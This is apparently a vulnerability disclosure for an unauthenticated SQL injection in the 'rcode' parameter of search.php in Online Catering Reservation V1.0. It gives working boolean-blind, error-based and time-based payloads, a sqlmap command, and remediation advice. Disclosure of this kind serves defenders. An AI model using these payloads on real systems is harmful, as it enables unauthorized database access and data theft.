# sourcecodester Online Catering Reservation V1.0 /search.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Online Catering Reservation

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/11221/online-catering-reservation.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /search.php

## Vulnerability location:
+ 'rcode' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=11221&title=Online+Catering+Reservation)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/search.php' file of the 'Online Catering Reservation' project. The reason for this issue is that attackers inject malicious code from the parameter 'rcode' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Catering Reservation In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/search.php" file. This vulnerability stems from insufficient user input validation of the 'rcode' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: rcode=234' OR NOT 6545=6545#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: rcode=234' AND GTID_SUBSET(CONCAT(0x716a6a7871,(SELECT (ELT(8991=8991,1))),0x7170767071),8991)-- MHrt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: rcode=234' AND (SELECT 6449 FROM (SELECT(SLEEP(5)))oAnc)-- yAqe
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u http://localhost/search.php --data="rcode=123" --batch
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773054283455-4ec812e1-3f55-4a77-b794-75d840be3513.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
